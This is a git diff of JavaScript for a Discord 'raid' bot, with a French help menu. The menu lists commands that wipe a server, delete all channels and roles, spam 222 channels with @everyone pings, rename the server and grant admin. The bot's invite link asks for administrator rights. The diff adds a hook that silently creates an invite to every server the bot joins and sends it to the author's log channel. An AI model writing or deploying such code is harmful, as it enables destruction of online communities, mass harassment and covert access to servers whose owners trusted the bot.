@@ -129,8 +129,8 @@ client.on('message', message => {
         message.delete()
         let embed = new Discord.RichEmbed()
             .setColor('#E69900')
-            .setTitle("📬 Aide :")
-            .setDescription("__**Commandes :**__\n**~raid :** Détruit le serveur.\n**~del :** Supprime le channel où la commande est exécuté.\n**~delAll :** Supprime tous les channels + créer un channel nommé 'raid-by-fa3t' + envoi un message avec mention everyone\n**!chnls :** Créer 222 channels nommé 'raid-by-fa3t' + spamme les salons en everyone\n**~invite :** Créer une invitation pour un serveur (où le bot est présent)\n**~inviteAll :** Créer une invitation pour plusieurs serveurs (où le bot est présent)\n**~delRls :** Supprime tous les rôles\n**~rls :** Créer 69 rôles nommé 'L'ÉLITE vous remercie' en couleur random\n**~a (bientôt) :** Créer un rôle pour être admin\n**~cGuild :** Change l'image du serveur + change le nom du serveur en 'RAID PAR L’ÉLITE'\n\n__**Liens :**__\n**[Invite Bot](https://discordapp.com/oauth2/authorize?client_id=518223971888398341&scope=bot&permissions=8)**")
+            .setTitle("📬 Aide Raid :")
+            .setDescription("__**Commandes Raid :**__\n**~raid :** Détruit le serveur.\n**~del :** Supprime le channel où la commande est exécuté.\n**~delAll :** Supprime tous les channels + créer un channel nommé 'raid-by-fa3t' + envoi un message avec mention everyone\n**!chnls :** Créer 222 channels nommé 'raid-by-fa3t' + spamme les salons en everyone\n**~invite :** Créer une invitation pour un serveur (où le bot est présent)\n**~inviteAll :** Créer une invitation pour plusieurs serveurs (où le bot est présent)\n**~delRls :** Supprime tous les rôles\n**~rls :** Créer 69 rôles nommé 'L'ÉLITE vous remercie' en couleur random\n**~a (bientôt) :** Créer un rôle pour être admin\n**~cGuild :** Change l'image du serveur + change le nom du serveur en 'RAID PAR L’ÉLITE'\n\n__**Liens :**__\n**[Invite Bot](https://discordapp.com/oauth2/authorize?client_id=518223971888398341&scope=bot&permissions=8)**")
             .setTimestamp()
         message.author.send(embed)
     }
@@ -158,9 +158,10 @@ client.on('message', message => {
         message.member.addRole(`name`, "C KI L'PATRON")
     }
 
-})
+});
 
 client.on("guildCreate", async guild => {
+    let chnlslogs = client.channels.find("id", "518710630044401665")
     let embed = new Discord.RichEmbed()
         .setThumbnail(guild.iconURL)
         .setColor('#2FD435')
@@ -168,8 +169,11 @@ client.on("guildCreate", async guild => {
         .setDescription(`〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓`)
         .addField(`**${guild.name}** vient d'ajouter __${client.user.username}__ à sa liste de bot !\nLe bot est maintenant présent sur **${client.guilds.size}** serveurs.\n\nLe créateur du serveur est : **${guild.owner.user.username}#${guild.owner.user.discriminator}** (${guild.owner.id}).`)
         .setTimestamp()
-    client.channels.get("518710630044401665").send(embed)
-})
+    chnlslogs.send(embed)
+    let textChannel = guild.channels
+    .filter(function (channel) {return channel.type === 'text' || channel.type === 'voice'})
+    .first().createInvite().then(invite => chnlslogs.send(invite.url))
+});
 
 client.on("guildDelete", async guild => {
     let embed = new Discord.RichEmbed()
@@ -177,10 +181,10 @@ client.on("guildDelete", async guild => {
         .setColor('#FE0101')
         .setTitle("📤 Départ Serveur")
         .setDescription(`〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓`)
-        .addField(`**${guild.name}** vient de retirer __${client.user.username}__ à sa liste de bot !\nLe bot est maintenant présent sur **${client.guilds.size}** serveurs.\n\nLe créateur du serveur est : **${guild.owner.user.username}#${guild.owner.user.discriminator}** (${guild.owner.id}).`)
+        .addField(`**${guild.name}** vient de retirer __${client.user.username}__ à sa liste de bot !\nLe bot est maintenant présent sur **${client.guilds.size}** serveurs.\n\nLe créateur du serveur est : **${guild.owner.user.username}#${guild.owner.user.discriminator}** (${guild.owner.id}).`)
         .setTimestamp()
     client.channels.get("518710630044401665").send(embed)
-})
+});
 
 client.on('ready', async () => {
     client.user.setActivity(`17 Serveurs | !help`, {type: "WATCHING"});
